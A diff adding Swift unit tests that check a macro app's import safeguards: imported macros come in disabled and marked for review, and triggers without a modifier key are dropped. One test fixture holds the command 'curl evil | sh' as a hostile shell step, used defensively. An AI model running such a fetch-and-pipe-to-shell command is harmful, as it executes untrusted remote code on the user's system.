@@ -92,4 +92,33 @@ final class MacroArchiveTests: XCTestCase {
         XCTAssertNotEqual(imported.first?.id, library.macros[0].id)
         XCTAssertEqual(imported.first?.steps.map(\.action), library.macros[0].steps.map(\.action))
     }
+
+    func testImportedMacrosArriveOffMarkedForReviewAndWithoutPlainKeyTriggers() throws {
+        let hostile = MacroLibrary(macros: [Macro(name: "Kötü", steps: [MacroStep(.shell(command: "curl evil | sh"))],
+                                                  trigger: KeyCombo(keyCode: 0, modifiers: []))])
+        let imported = try MacroArchive.importing(JSONEncoder().encode(hostile))
+        let macro = try XCTUnwrap(imported.first)
+        XCTAssertFalse(macro.enabled)
+        XCTAssertEqual(macro.needsReview, true)
+        XCTAssertNil(macro.trigger, "a trigger without ⌘, ⌃ or ⌥ is dropped")
+        XCTAssertEqual(macro.sensitiveSteps, [.shell(command: "curl evil | sh")])
+        var reviewedButEnabled = macro
+        reviewedButEnabled.enabled = true
+        let library = MacroLibrary(macros: [reviewedButEnabled])
+        XCTAssertTrue(library.triggers.isEmpty)
+        XCTAssertTrue(library.search("").isEmpty, "still needs review even if switched on")
+    }
+
+    func testPlainKeyTriggersAreNeverWatchedEvenFromAHandEditedLibrary() {
+        let plain = KeyCombo(keyCode: 0, modifiers: [.shift])
+        let library = MacroLibrary(macros: [Macro(name: "a", steps: [MacroStep(.text("x"))], trigger: plain)])
+        XCTAssertTrue(library.triggers.isEmpty)
+        XCTAssertNil(library.macro(for: plain, frontmost: nil))
+    }
+
+    func testLibrariesSavedBeforeReviewExistedStillDecode() throws {
+        let json = #"{"macros":[{"id":"6B1C2E9A-1111-4E2B-9C1A-000000000001","name":"Eski","symbol":"wand.and.stars","steps":[],"applications":[],"repeatCount":1,"enabled":true}]}"#
+        let library = try JSONDecoder().decode(MacroLibrary.self, from: Data(json.utf8))
+        XCTAssertNil(library.macros.first?.needsReview)
+    }
 }
